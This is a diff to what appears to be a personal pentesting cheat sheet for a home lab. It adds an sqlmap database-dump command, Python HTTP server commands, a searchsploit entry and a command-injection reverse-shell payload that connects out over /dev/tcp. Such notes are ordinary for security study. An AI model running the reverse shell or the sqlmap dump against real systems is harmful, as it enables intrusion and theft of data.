@@ -1378,7 +1378,20 @@ bash/zsh + linux terminal cli tools commands
   - nikto -h 192.168.1.2
 - dirb: web directory scanner
   - dirb http://192.168.1.2
+- sqlmap: auto sql injection + exploit tool
+  - e.g: sqlmap -u "http://192.168.1.18/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
 
+---------------------------------------------------------------------
+python simple http server
+---------------------------------------------------------------------
+- python2:
+  - python -m SimpleHTTPServer
+- python3:
+  - python -m http.server
+---------------------------------------------------------------------
+command injection
+---------------------------------------------------------------------
+- reverse shell: ;bash -i >& /dev/tcp/192.168.1.16/1234 0>&1
 ---------------------------------------------------------------------
 useful enumeration tools
 ---------------------------------------------------------------------
@@ -1386,6 +1399,8 @@ useful enumeration tools
   - nikto
   - dirb
   - ffuf
+- search exploits:
+  - searchsploit
 ---------------------------------------------------------------------
 virtualbox setup internal network
 ---------------------------------------------------------------------
